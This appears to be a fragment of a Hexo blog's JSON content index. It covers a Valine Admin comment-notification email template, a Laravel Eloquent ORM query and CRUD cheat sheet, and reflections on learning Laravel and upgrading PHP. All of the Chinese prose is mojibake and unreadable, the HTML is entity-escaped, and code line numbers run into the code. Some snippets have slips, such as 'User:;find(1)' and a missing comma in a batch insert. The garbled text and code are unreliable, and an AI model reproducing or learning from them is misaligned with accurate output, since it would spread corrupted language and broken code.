$&#123;PARENT_COMMENT&#125;&lt;&#x2F;div&gt;&lt;p&gt;&lt;strong&gt;$&#123;NICK&#125;&lt;&#x2F;strong&gt;å›å¤è¯´ï¼š&lt;&#x2F;p&gt;&lt;div style&#x3D;&quot;background-color: #f5f5f5;padding: 10px 15px;margin:18px 0;word-wrap:break-word;&quot;&gt; $&#123;COMMENT&#125;&lt;&#x2F;div&gt;&lt;p&gt;æ‚¨å¯ä»¥ç‚¹å‡»&lt;a style&#x3D;&quot;text-decoration:none; color:#12addb&quot; href&#x3D;&quot;$&#123;POST_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;æŸ¥çœ‹å›å¤çš„å®Œæ•´å…§å®¹&lt;&#x2F;a&gt;ï¼Œæ¬¢è¿å†æ¬¡å…‰ä¸´&lt;a style&#x3D;&quot;text-decoration:none; color:#12addb&quot; href&#x3D;&quot;$&#123;SITE_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;$&#123;SITE_NAME&#125;&lt;&#x2F;a&gt;ã€‚&lt;br&gt;&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt; é»˜è®¤åšä¸»é€šçŸ¥é‚®ä»¶å†…å®¹æ¨¡æ¿å¦‚ä¸‹ï¼š 1&lt;div style&#x3D;&quot;border-top:2px solid #12ADDB;box-shadow:0 1px 3px #AAAAAA;line-height:180%;padding:0 15px 12px;margin:50px auto;font-size:12px;&quot;&gt;&lt;h2 style&#x3D;&quot;border-bottom:1px solid #DDD;font-size:14px;font-weight:normal;padding:13px 0 10px 8px;&quot;&gt;æ‚¨åœ¨&lt;a style&#x3D;&quot;text-decoration:none;color: #12ADDB;&quot; href&#x3D;&quot;$&#123;SITE_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;$&#123;SITE_NAME&#125;&lt;&#x2F;a&gt;ä¸Šçš„æ–‡ç« æœ‰äº†æ–°çš„è¯„è®º&lt;&#x2F;h2&gt;&lt;p&gt;&lt;strong&gt;$&#123;NICK&#125;&lt;&#x2F;strong&gt;å›å¤è¯´ï¼š&lt;&#x2F;p&gt;&lt;div style&#x3D;&quot;background-color: #f5f5f5;padding: 10px 15px;margin:18px 0;word-wrap:break-word;&quot;&gt; $&#123;COMMENT&#125;&lt;&#x2F;div&gt;&lt;p&gt;æ‚¨å¯ä»¥ç‚¹å‡»&lt;a style&#x3D;&quot;text-decoration:none; color:#12addb&quot; href&#x3D;&quot;$&#123;POST_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;æŸ¥çœ‹å›å¤çš„å®Œæ•´å…§å®¹&lt;&#x2F;a&gt;&lt;br&gt;&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt; è¿™é‡Œæœ‰ä¸ªé—®é¢˜å°±æ˜¯éƒ¨åˆ†å˜é‡ä¸å†å¯ç”¨ï¼Œå¦‚æœä½¿ç”¨äº†æœªå®šä¹‰çš„å˜é‡ï¼Œå‘é€é‚®ä»¶æ—¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼š æˆ‘é€‰æ‹©å»æ‰äº†éƒ¨åˆ†å˜é‡ï¼Œè¿™å°±å¯¼è‡´äº†é‚®ä»¶éƒ¨åˆ†å†…å®¹æ˜¯ç¼ºå¤±çš„ï¼š è¿™é‡Œæ²¡ç»§ç»­å¾€ä¸‹æ·±ç©¶äº†ï¼Œèƒ½ç”¨å°±è¡Œï¼Œè‡³æ­¤å°±å®Œæˆäº†æ‰€æœ‰é…ç½®ã€‚å¦‚æœä½ é‡åˆ°ä¸€äº›å¥‡æ€ªçš„é—®é¢˜ï¼Œå¯ä»¥çœ‹çœ‹ä»¥ä¸‹å»ºè®®å¯¹ä½ æ˜¯å¦æœ‰ç”¨ï¼š å¸¸è§é—®é¢˜ LeanCloud åˆ†å›½å†…ç‰ˆå’Œå›½é™…ç‰ˆï¼Œå¦‚æœä½ å’Œæˆ‘ä¸€æ ·ä¸å–œæ¬¢åŸŸåå¤‡æ¡ˆï¼Œä½¿ç”¨çš„æ˜¯å›½é™…åŸŸåæœåŠ¡å•†æä¾›çš„åŸŸåï¼Œé‚£ä¹ˆæ³¨å†ŒLeanCloud æ—¶ï¼Œè¯·é€‰é€‰æ‹©å›½é™…ç‰ˆã€‚ åŸŸåè§£æå¦‚æœé•¿æ—¶é—´æœªç”Ÿæ•ˆï¼Œè¯·æ£€æŸ¥æ·»åŠ CNAME çºªå½•ï¼Œttl ä¸è¦é€‰æ‹©ä¸€å°æ—¶ï¼Œé€‰æ‹©å…­ç™¾ç§’ã€‚ SMTP_PASS ä¸æ˜¯QQ é‚®ç®±çš„å¯†ç ï¼Œè€Œæ˜¯SMTPæœåŠ¡çš„å¯†é’¥ï¼Œå¦‚æœä¸çŸ¥é“å¦‚ä½•è·å–ï¼Œå¯ä»¥çœ‹è¿™é‡Œã€‚ ä¿®æ”¹å®Œå˜é‡ï¼Œéœ€è¦é‡å¯åº”ç”¨ï¼Œå¦è€…ä¸ä¼šç”Ÿæ•ˆã€‚ å‚è€ƒé“¾æ¥ Valine Admin Valine Admin é…ç½®æ‰‹å†Œ","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"}]},{"title":"Laravel Eloquent ORM å¸¸ç”¨æ“ä½œæ•´ç†","slug":"laravel-eloquent-orm-common-operations-finishing","date":"2021-04-04T01:22:30.000Z","updated":"2021-06-16T13:54:34.510Z","comments":true,"path":"laravel-eloquent-orm-common-operations-finishing/","link":"","permalink":"https://www.0x2beace.com/laravel-eloquent-orm-common-operations-finishing/","excerpt":"Laravel æ”¯æŒåŸç”Ÿçš„ SQL æŸ¥è¯¢ã€æµç•…çš„æŸ¥è¯¢æ„é€ å™¨ å’Œ Eloquent ORM ä¸‰ç§æŸ¥è¯¢æ–¹å¼ï¼š","text":"Laravel æ”¯æŒåŸç”Ÿçš„ SQL æŸ¥è¯¢ã€æµç•…çš„æŸ¥è¯¢æ„é€ å™¨ å’Œ Eloquent ORM ä¸‰ç§æŸ¥è¯¢æ–¹å¼ï¼š æµç•…çš„æŸ¥è¯¢æ„é€ å™¨ï¼ˆç®€ç§°DBï¼‰ï¼Œå®ƒæ˜¯ä¸ºåˆ›å»ºå’Œè¿è¡Œæ•°æ®åº“æŸ¥è¯¢æä¾›çš„ä¸€ä¸ªæ¥å£ï¼Œæ”¯æŒå¤§éƒ¨åˆ†æ•°æ®åº“æ“ä½œï¼Œå’Œæ‰‹å†™SQL çš„æœ¬è´¨æ˜¯ä¸€æ ·çš„ã€‚ Eloquent ORMï¼ˆç®€ç§°ORMï¼‰ï¼Œæ˜¯ä¸€ä¸ªå¯¹è±¡å…³ç³»æ˜ å°„(Object Relational Mapper)å·¥å…·ï¼Œé€šè¿‡å»ºç«‹æ¨¡å‹ä¸æ•°æ®è¡¨è¿›è¡Œäº¤äº’ï¼Œå®ƒä¼šæŠŠæ•°æ®åº“ä¸­çš„æ•°æ®æ˜ å°„æˆå¯¹è±¡å’Œé›†åˆå¯¹è±¡ï¼Œæ— éœ€æ¥è§¦åº•å±‚æ•°æ®ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨æ˜ å°„å‡ºæ¥çš„å¯¹è±¡è¿›è¡Œå¼€å‘ã€‚ è¿™ç¯‡ç¬”è®°ä¸»è¦æ¥æ•´ç†ä¸‹å¸¸ç”¨çš„ORM æ“ä½œã€‚ æŸ¥è¯¢artisan tinker æ˜¯ Laravel æ¡†æ¶è‡ªå¸¦çš„å‘½ä»¤ï¼Œç”¨ä»¥è°ƒå‡º Laravel çš„äº¤äº’å¼è¿è¡Œæ—¶ï¼ŒEloquent ORM çš„ä»£ç å¯ä»¥ç›´æ¥åœ¨è¯¥ç¯å¢ƒä¸­è¿è¡Œã€‚ æŸ¥è¯¢åˆ—è¡¨è·å–æ‰€æœ‰æ•°æ®ï¼š 12use App\\Models\\User;$users = User::all(); å¦‚æœåªéœ€è¦éƒ¨åˆ†å­—æ®µï¼Œæœ‰ä¸¤ç§æ–¹å¼è¿›è¡Œé™å®šï¼š 123$users = User::all([\"id\", \"name\"]);$users = User::select(\"id\", \"name\")-&gt;get(); è·å–å•åˆ—ï¼š 12$name = User::pluck('name');// [\"boo\", \"mac\", \"yumi\"] è¿˜å¯ä»¥åœ¨è¿”å›çš„é›†åˆä¸­æŒ‡å®šå­—æ®µçš„è‡ªå®šä¹‰é”®åï¼Œæ³¨æ„ï¼šè¯¥è‡ªå®šä¹‰é”®å¿…é¡»æ˜¯è¯¥è¡¨çš„å…¶å®ƒå­—æ®µåˆ—åï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼š 12$name = User::pluck('email','name');// [\"boo\" =&gt; \"boo@example.com\", \"yumi\" =&gt; \"yumi@example.com\"] æŸ¥è¯¢å•æ¡æ•°æ®1234567891011121314// é€šè¿‡ä¸»é”®è·å–æ¨¡å‹$user = User:;find(1);// è·å–åŒ¹é…æŸ¥è¯¢æ¡ä»¶çš„ç¬¬ä¸€ä¸ªæ¨¡å‹$user = User::where('is_enable', 1)-&gt;first();// è·å–ç¬¬ä¸€æ¡æ•°æ®çš„æŒ‡å®šåˆ—å€¼$user = User::value(\"name\"); // è¿”å›ç»“æœæ˜¯å­—ç¬¦ä¸²ï¼šboo// ä¼ é€’ä¸»é”®æ•°ç»„æ¥è°ƒç”¨ find æ–¹æ³•ï¼Œè¿”å›åŒ¹é…è®°å½•é›†åˆ$user = User::find([1,2,3]); // ç­‰åŒäº $user = User::whereIn(\"id\", [1,2,3])-&gt;get(); å¤„ç†è¿”å›ç»“æœé›†Eloquent ORM æŸ¥è¯¢è¿”å›å€¼æ˜¯ Illuminate\\Database\\EloquentCollection çš„ä¸€ä¸ªå®ä¾‹ï¼Œæ‰€ä»¥é™¤äº†å¯ä»¥ä½¿ç”¨ä¼ ç»Ÿçš„æ•°ç»„æ–¹å¼è¿›è¡Œéå†ï¼Œè¿˜å¯ä»¥ä½¿ç”¨é›†åˆæ–¹å¼è¿›è¡Œéå†ã€‚ chunkchunkæ–¹æ³•å¯ä»¥æŠŠå¤§çš„ç»“æœé›†åˆ†æˆå°å—æŸ¥è¯¢ï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¨éƒ¨User è¡¨æ•°æ®åˆ‡å‰²æˆä¸€æ¬¡å¤„ç† 5 æ¡è®°å½•çš„ä¸€å°å—ï¼š 123456$result = User::chunk(5, function ($users) &#123; foreach ($users as $user) &#123; echo $user-&gt;name.PHP_EOL; &#125;&#125;);// result ä¸º boolean åœ¨Userè¡¨ä¸­ä¸€å…±æœ‰14æ¡æ•°æ®ï¼Œé€šè¿‡æŸ¥çœ‹æŸ¥è¯¢æ—¥å¿—ï¼Œå¯ä»¥çœ‹åˆ°chunk åˆ†äº†ä¸‰æ¬¡æŸ¥è¯¢ ï¼š eachå¦‚æœæƒ³å¯¹ä¸€ä¸ªé›†åˆä¸­çš„æ¯ä¸€é¡¹éƒ½è¿›è¡Œä¸€äº›æ“ä½œï¼Œä½†ä¸ä¿®æ”¹é›†åˆæœ¬èº«ï¼Œåˆ™å¯ä»¥ä½¿ç”¨eachï¼š 12345$users = User::all();$users = $users-&gt;each(function ($user , $key) &#123; $user-&gt;password = bcrypt(122410);&#125;);// è¿”å›ç»“æœåŒ…å«å®Œæ•´çš„Useræ¨¡å‹ï¼Œå…¶ä¸­password å­—æ®µçš„å€¼è¢«ä¿®æ”¹ mapå¦‚æœæƒ³å¯¹é›†åˆä¸­çš„æ‰€æœ‰å…ƒç´ è¿›è¡Œè¿­ä»£ï¼Œå¯¹å®ƒä»¬è¿›è¡Œä¿®æ”¹ï¼Œå¹¶è¿”å›åŒ…å«ä¿®æ”¹çš„æ–°é›†åˆï¼Œé‚£ä¹ˆéœ€è¦ä½¿ç”¨mapï¼š 12345678$users = User::all();$users = $users-&gt;map(function ($user, $key) &#123; return [ \"name\" =&gt; $user-&gt;name, \"password\" =&gt; bcrypt(122410), ];&#125;);// è¿”å›ç»“æœä»…åŒ…å«name å’Œpassword å­—æ®µï¼Œå…¶ä¸­password å­—æ®µçš„å€¼è¢«ä¿®æ”¹ èšåˆæ–¹æ³•123456// ç»Ÿè®¡æ€»æ•°$count = User::count();// ç»Ÿè®¡åˆ†ç»„$count = User::groupBy(\"is_enable\")-&gt;selectRaw(\"count(id) as aggregate\")-&gt;get();// æ³¨æ„ä¸èƒ½è¿™æ ·å†™ï¼šUser::select('count(id) as aggregate')-&gt;groupBy(\"is_enable\")-&gt;get(); æ¡ä»¶æŸ¥è¯¢æ„å»ºå¤æ‚æŸ¥è¯¢ï¼š 1234567891011121314151617181920212223242526272829// ç»„åˆæŸ¥è¯¢æ–¹å¼ä¸€$where = [];$where[] = [\"is_enable\", 1];$where[] = [ function($query)&#123; $query-&gt;where(\"id\", \"&gt;\", 10) -&gt;orWhere(\"name\", \"like\", \"%admin%\");&#125;];User::select(\"id\", \"name as username\", \"email\")-&gt;where($where)-&gt;get(); // ç»„åˆæŸ¥è¯¢æ–¹å¼äºŒ$builder = User::select(\"id\", \"name as username\", \"email\");$builder-&gt;where(\"is_enable\", 1);$builder-&gt;where(function ($query)&#123; $query-&gt;where(\"id\", \"&gt;\", 10) -&gt;orWhere(\"name\", \"like\", \"%admin%\");&#125;);$users = $builder-&gt;get();// ä¸¤ç§æ–¹å¼çš„æŸ¥è¯¢SQL æ˜¯ä¸€æ ·çš„ï¼š select `id`, `name` as `username`, `email` from `users` where (`is_enable` = '1' and (`id` &gt; '10' or `name` like '%admin%'))// Where Exists$builder = User::select(\"id\", \"name\", \"email\");$builder-&gt;whereExists(function ($query)&#123; $query-&gt;select(User::raw(1)) -&gt;from(\"topics\") -&gt;whereRaw(\"topics.user_id = users.id\");&#125;);// æŸ¥è¯¢å‘è¿‡æ–‡ç« çš„ç”¨æˆ· æ’åº1234567891011// ç”¨æˆ·id å€’åº$user = User::orderBy(\"id\", \"desc\")-&gt;get();// è·å–created_at æœ€å¤§çš„ä¸€æ¡è®°å½•$user = User::latest()-&gt;first();// è·å–created_at æœ€å°çš„ä¸€æ¡è®°å½•$user = User::oldest()-&gt;first();// éšæœºä¸€æ¡è®°å½•$users = User::inRandomOrder()-&gt;first(); é™å®š123456// è·³è¿‡å‰ä¸¤æ¡è®°å½•ï¼Œå–ä¸‰æ¡è®°å½•$users = User::skip(2)-&gt;take(3)-&gt;get();// è¾“å‡ºSQLï¼šselect * from `users` limit 3 offset 2 // åŒä¸Š$users = User::offset(2)-&gt;limit(3)-&gt;get(); å…¶ä»–1234567// ä½¿ç”¨åˆ«å$user = User::select(\"name as username\", \"id\")-&gt;first();// åˆ›å»ºä¸€ä¸ªæŸ¥è¯¢æ„å»ºå™¨$builder = User::select(\"name\");// æ·»åŠ ä¸€ä¸ªæŸ¥è¯¢åˆ—åˆ°å·²å­˜åœ¨çš„ select å­å¥$user = $builder-&gt;addSelect(\"id\")-&gt;first(); åˆ†é¡µ12$users &#x3D; User::paginate(10);$users &#x3D; User::simplePaginate(10); paginate æ–¹æ³•ï¼Œè¿”å›Illuminate\\Pagination\\LengthAwarePaginatorå®ä¾‹ simplePaginate æ–¹æ³•ï¼Œè¿”å›Illuminate\\Pagination\\Paginatorå®ä¾‹ æ¯ä¸ªåˆ†é¡µå™¨å®ä¾‹éƒ½å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•æä¾›æ›´å¤šåˆ†é¡µä¿¡æ¯ï¼š 1234567891011$result-&gt;count() &#x2F;&#x2F; å½“å‰é¡µæ¡æ•° $result-&gt;currentPage() &#x2F;&#x2F; å½“å‰é¡µç $result-&gt;perPage() &#x2F;&#x2F; æ¯é¡µå¤šå°‘æ¡$result-&gt;total() &#x2F;&#x2F; æ€»æ•°(ä½¿ç”¨simplePaginate æ—¶æ— æ•ˆ)$result-&gt;hasMorePages() &#x2F;&#x2F; æ˜¯å¦æœ‰æ›´å¤š$result-&gt;firstItem() $result-&gt;lastItem()$result-&gt;lastPage() (ä½¿ç”¨simplePaginate æ—¶æ— æ•ˆ)$result-&gt;nextPageUrl()$result-&gt;previousPageUrl()$result-&gt;url($page) æ’å…¥å•æ¡æ’å…¥ï¼š 123456789101112131415161718192021$user = new User();$user-&gt;name = \"yumi\";$user-&gt;fill([\"email\" =&gt; \"yumi@example.com\"]);$user-&gt;save();// è¿”å›æ¨¡å‹å¯¹è±¡$user = new User( [\"name\"=&gt;\"boo\", 'email' =&gt; 'boo@example.com']);$user-&gt;save();$result = User::create( [\"name\"=&gt;\"boo\", 'email' =&gt; 'boo@example.com']);// è¿”å›æ¨¡å‹å¯¹è±¡// å•æ¡æ’å…¥ï¼Œå¹¶è¿”å›å¯¹åº” ID$result = User::insertGetId( [\"name\"=&gt;\"boo\", 'email' =&gt; 'boo@example.com']);// è¿”å›æ’å…¥è®°å½•å¯¹åº”ID æ‰¹é‡æ’å…¥ï¼š 12345$result = User::insert([ [\"name\"=&gt;\"boo\", 'email' =&gt; 'boo@example.com'] [\"name\"=&gt;\"yumi\", 'email' =&gt; 'yumi@example.com']]);// è¿”å›Boolean æ³¨æ„âš ï¸ï¼šæ­¤æ—¶ä¸ä¼šè§¦å‘savingã€saved æ¨¡å‹äº‹ä»¶ æ›´æ–°å•æ¡æ›´æ–° 1234567891011$user = User::find(1);$user-&gt;name = 'yumi';$user-&gt;save();// è¿”å›Boolean$user = User::find(1);$user-&gt;update($data);// è¿”å›å—å½±å“è¡Œæ•°$user = User::where(\"id\", 1)-&gt;update(['password' =&gt; bcrypt(122410)]);// è¿”å›å—å½±å“è¡Œæ•° æ‰¹é‡æ›´æ–°ï¼š 12$user = User::whereIn(\"id\", [1,2,3])-&gt;update(['password' =&gt; bcrypt(122410)]); // è¿”å›å—å½±å“è¡Œæ•° åˆ é™¤å•ä¸ªåˆ é™¤ 12345678910// é€šè¿‡ä¸»é”®æŸ¥è¯¢ï¼Œåˆ é™¤æ¨¡å‹$user = User::find(1);$user-&gt;delete();// è¿”å›Boolean// ç›´æ¥é€šè¿‡ä¸»é”®åˆ é™¤User::destroy(1);// è¿”å›å—å½±å“è¡Œæ•°User::where('id', 1)-&gt;delete(); æ‰¹é‡åˆ é™¤ï¼š 1234567User::destroy([1, 2, 3]);User::destroy(1, 2, 3);// æ³¨ï¼šé€šè¿‡ Eloquent æ‰¹é‡åˆ é™¤æ—¶ï¼Œdeleting å’Œ deletedäº‹ä»¶ä¸ä¼šè¢«è§¦å‘ï¼Œå› ä¸ºåœ¨è¿›è¡Œæ¨¡å‹åˆ é™¤æ—¶ä¸ä¼šè·å–æ¨¡å‹ã€‚User::whereIn('id', [1, 2, 3])-&gt;delete();// å‡è¿”å›å—å½±å“è¡Œæ•° è½¯åˆ é™¤é™¤äº†çœŸå®åˆ é™¤æ•°æ®åº“è®°å½•ï¼ŒEloquent ä¹Ÿå¯ä»¥ã€Œè½¯åˆ é™¤ã€æ¨¡å‹ã€‚è½¯åˆ é™¤çš„æ¨¡å‹å¹¶ä¸æ˜¯çœŸçš„ä»æ•°æ®åº“ä¸­åˆ é™¤äº†ã€‚ äº‹å®ä¸Šï¼Œæ˜¯åœ¨æ¨¡å‹ä¸Šè®¾ç½®äº† deleted_at å±æ€§å¹¶å°†å…¶å€¼å†™å…¥æ•°æ®åº“ã€‚å¦‚æœ deleted_at å€¼éç©ºï¼Œä»£è¡¨è¿™ä¸ªæ¨¡å‹å·²è¢«è½¯åˆ é™¤ã€‚ å¦‚æœè¦å¼€å¯æ¨¡å‹è½¯åˆ é™¤åŠŸèƒ½ï¼Œéœ€è¦åšå¥½ä¸‰ä»¶äº‹æƒ…ï¼š æ•°æ®åº“å¢åŠ deleted_at å­—æ®µ åœ¨æ¨¡å‹ä¸Šå¯¼å…¥ Illuminate\\Database\\Eloquent\\SoftDeletesç‰¹å¾ åŒæ—¶å°†deleted_at åˆ—æ·»åŠ åˆ° $dates å±æ€§ 12345678910111213&lt;?phpnamespace App\\Models;use Illuminate\\Database\\Eloquent\\Model;use Illuminate\\Database\\Eloquent\\SoftDeletes;class User extends Model&#123; use SoftDeletes; protected $dates = ['deleted_at'];&#125; ç°åœ¨ï¼Œå½“åœ¨æ¨¡å‹å®ä¾‹ä¸Šä½¿ç”¨ delete æ–¹æ³•ï¼Œå½“å‰æ—¥æœŸæ—¶é—´ä¼šå†™å…¥ deleted_at å­—æ®µã€‚åŒæ—¶ï¼ŒæŸ¥è¯¢å‡ºæ¥çš„ç»“æœä¹Ÿä¼šè‡ªåŠ¨æ’é™¤å·²è¢«è½¯åˆ é™¤çš„è®°å½•ã€‚ è½¯åˆ é™¤å¸¸è§æ“ä½œ12345678910111213// éªŒè¯ç»™å®šçš„æ¨¡å‹å®ä¾‹æ˜¯å¦å·²è¢«è½¯åˆ é™¤if ($user-&gt;trashed()) &#123; //&#125;// åŒ…æ‹¬å·²è½¯åˆ é™¤çš„æ¨¡å‹$users = User::withTrashed()-&gt;get(); // åªæ£€ç´¢è½¯åˆ é™¤æ¨¡å‹ $users = User::onlyTrashed()-&gt;get();// æ°¸ä¹…åˆ é™¤$user-&gt;forceDelete(); æ³¨æ„âš ï¸ï¼š é€šè¿‡ Eloquent æ‰¹é‡åˆ é™¤æ—¶ï¼Œdeleting å’Œ deleted äº‹ä»¶ä¸ä¼šè¢«è§¦å‘ï¼Œå› ä¸ºåœ¨è¿›è¡Œæ¨¡å‹åˆ é™¤æ—¶ä¸ä¼šè·å–æ¨¡å‹ã€‚ é€šè¿‡ Eloquent æ‰¹é‡æ›´æ–°æ—¶ï¼Œæ›´æ–°çš„æ¨¡å‹ä¸ä¼šè§¦å‘ saving, saved, updating å’Œ updated æ¨¡å‹äº‹ä»¶ã€‚è¿™æ˜¯å› ä¸ºåœ¨æ‰¹é‡æ›´æ–°æ—¶å®é™…ä¸Šä»æœªæ£€ç´¢æ¨¡å‹ã€‚ å‚è€ƒé“¾æ¥ Eloquent å¿«é€Ÿå…¥é—¨ Laravel ä¸­Eloquent ORM ç›¸å…³æ“ä½œ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"è°ˆè°ˆç¬¬ä¸€æ¬¡ä½¿ç”¨ Laravel å¼€å‘çš„æ„Ÿæƒ³","slug":"talk-about-the-feelings-of-using-laravel-development-for-the-first-time","date":"2021-04-03T04:36:54.000Z","updated":"2021-04-03T09:35:09.242Z","comments":true,"path":"talk-about-the-feelings-of-using-laravel-development-for-the-first-time/","link":"","permalink":"https://www.0x2beace.com/talk-about-the-feelings-of-using-laravel-development-for-the-first-time/","excerpt":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•ä¸€ä¸‹ä½¿ç”¨Laravel å¼€å‘çš„ä¸€äº›æ„Ÿæƒ³ã€‚","text":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•ä¸€ä¸‹ä½¿ç”¨Laravel å¼€å‘çš„ä¸€äº›æ„Ÿæƒ³ã€‚ ç¬”è€…æœ€æ—©æ¥è§¦çš„ç¬¬ä¸€ä¸ªPHP æ¡†æ¶æ˜¯ThinkPHP 3.2ï¼Œå†™è¿‡æ¥å£ï¼Œåšè¿‡ç½‘ç«™ã€‚ åæ¥å‘ç°äº†Laravel è¿™ä¸ªæ¡†æ¶ï¼Œé‚£æ—¶æœ€æ–°çš„ç‰ˆæœ¬æ˜¯5.xï¼Œå½“æ—¶å°±è§‰å¾—è¿™ä¸ªæ¡†æ¶å¯çœŸé«˜çº§ï¼Œå¥½å¤šä»æœªäº†è§£åˆ°çš„æ¦‚å¿µã€‚ ä¹Ÿæ­£æ˜¯ä»é‚£ä¸ªæ—¶å€™å¼€å§‹äº†è§£Laravelï¼Œé€šè¿‡learnku ä¸Šçš„ç³»åˆ—è¯¾ç¨‹è¿›è¡Œå­¦ä¹ ï¼Œ å‰å‰ååä¹Ÿæ˜¯èŠ±äº†ä¸å°‘æ—¶é—´åœ¨ä¸Šé¢ï¼Œå§‹ç»ˆæ²¡æœºä¼šè¿›å…¥é¡¹ç›®å®æˆ˜ï¼Œä¸€ç›´åœç•™åœ¨å­¦ä¹ å±‚é¢ã€‚ ä»Šå¹´çš„ç¬¬ä¸€ä¸ªé¡¹ç›®æœ‰å¹¸ä½¿ç”¨Laravel ä»é›¶å¼€å‘ï¼Œå½“æˆ‘å†æ¬¡æ¡èµ·ä¹‹å‰çœ‹è¿‡çš„è¯¾ç¨‹ï¼Œæ„Ÿè§‰å‡ ä¹ç™½çœ‹äº†ï¼Œå¥½å¤šç‚¹å®Œå…¨éƒ½æ²¡å°è±¡äº†ã€‚ æœ‰å¹¸é‡åˆ°ä¸€ä½ä¸é”™çš„é¡¹ç›®ç»„é•¿ï¼Œé¡¹ç›®å¼€å‘åˆæœŸç»™äº†ä¸€äº›æ—¶é—´å»åšå‡†å¤‡ã€‚ è¿™ä¸€å‘¨æ˜¯æ–°é¡¹ç›®æ­£å¼å¼€å§‹çš„ç¬¬ä¸€å‘¨ï¼Œé¡¹ç›®è¿›å±•æŒºé¡ºåˆ©çš„ï¼ˆæ²¡æœ‰æ‹–åè…¿ ğŸ˜€ï¼‰ï¼Œä¸å¾—ä¸è¯´ä½¿ç”¨Laravel å¼€å‘çš„æ•ˆç‡çœŸçš„å¾ˆé«˜ï¼Œä¸°å¯Œçš„ç¬¬ä¸‰æ–¹æ‰©å±•åŒ…å¯ä»¥æ»¡è¶³æ—¥å¸¸å¼€å‘çš„ç»å¤§å¤šæ•°åº”ç”¨åœºæ™¯ã€‚ è¿™ä¸ç¦è®©æˆ‘å¼•å‘æ€è€ƒï¼Œä¸ºä»€ä¹ˆä¹‹å‰èŠ±æ›´å¤šçš„æ—¶é—´å’Œç²¾åŠ›å»å­¦ä¹ ï¼Œå´è¿˜æ²¡æœ‰è¿™çŸ­çŸ­åŠä¸ªæœˆçš„æ”¶è·å¤§å‘¢ï¼Ÿ åŸå› å¾ˆç®€å•ï¼šç¼–ç¨‹æ˜¯æŠ€èƒ½ï¼Œä¸æ˜¯çŸ¥è¯†ï¼ŒæŠ€èƒ½åªæœ‰åœ¨ä¸æ–­ç»ƒä¹ ä¸‹æ‰ä¼šæœ‰è¿›æ­¥ ã€‚ å€Ÿç”¨ä¸€å¥è€è¯æ¥è®²å°±æ˜¯ï¼šçº¸ä¸Šå¾—æ¥ç»ˆè§‰æµ…ï¼Œç»çŸ¥æ­¤äº‹è¦èº¬è¡Œã€‚ ç°åœ¨å†å›å¤´çœ‹çœ‹learnku.com çš„ç«™é•¿ï¼Œåœ¨ä»‹ç»å¦‚ä½•æ­£ç¡®é˜…è¯»æœ¬ä¹¦æ—¶ï¼Œè¯´çš„ä¸€æ®µè¯ï¼ŒçœŸçš„ç‰¹åˆ«å¥½ï¼Œå¼ºè°ƒâ€œåˆ»æ„ç»ƒä¹ â€çš„é‡è¦æ€§ã€‚ æ‰€ä»¥ä¸èƒ½æ€»æ˜¯åœç•™åœ¨å­¦ä¹ é˜¶æ®µï¼Œæœ‰ä¸€å®šåŸºç¡€ä¹‹åï¼Œå°±å»åšï¼Œé‡åˆ°é—®é¢˜è§£å†³é—®é¢˜ï¼Œä¸ç”¨å¤ªåœ¨æ„ç»“æœå¦‚ä½•ï¼ŒåŠ¨æ‰‹å»åšå°±å¥½äº†ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"},{"name":"ä¸€äº›æ€è€ƒ","slug":"PHP/Laravel/ä¸€äº›æ€è€ƒ","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"},{"name":"ä¸€äº›æ€è€ƒ","slug":"ä¸€äº›æ€è€ƒ","permalink":"https://www.0x2beace.com/tags/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"}]},{"title":"è®°ä¸€æ¬¡å‡çº§ PHP å¼•å‘çš„ä¸€äº›æ€è€ƒ","slug":"some-thoughts-caused-by-upgrading-php-at-a-time","date":"2021-03-31T15:27:38.000Z","updated":"2021-04-03T04:39:35.526Z","comments":true,"path":"some-thoughts-caused-by-upgrading-php-at-a-time/","link":"","permalink":"https://www.0x2beace.com/some-thoughts-caused-by-upgrading-php-at-a-time/","excerpt":"å› ä¸ºå·¥ä½œåŸå› ï¼Œä»Šå¤©å°†æœ¬åœ°å¼€å‘ç¯å¢ƒçš„PHP å‡çº§åˆ°7.4 äº†ï¼Œæ­¤å‰ä¸€ç›´ä½¿ç”¨7.3ã€‚ ä¸­é—´é‡åˆ°äº†ä¸€äº›å°é—®é¢˜ï¼Œæ€»ä½“è¿˜ç®—é¡ºåˆ©ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹ã€‚","text":"å› ä¸ºå·¥ä½œåŸå› ï¼Œä»Šå¤©å°†æœ¬åœ°å¼€å‘ç¯å¢ƒçš„PHP å‡çº§åˆ°7.4 äº†ï¼Œæ­¤å‰ä¸€ç›´ä½¿ç”¨7.3ã€‚ 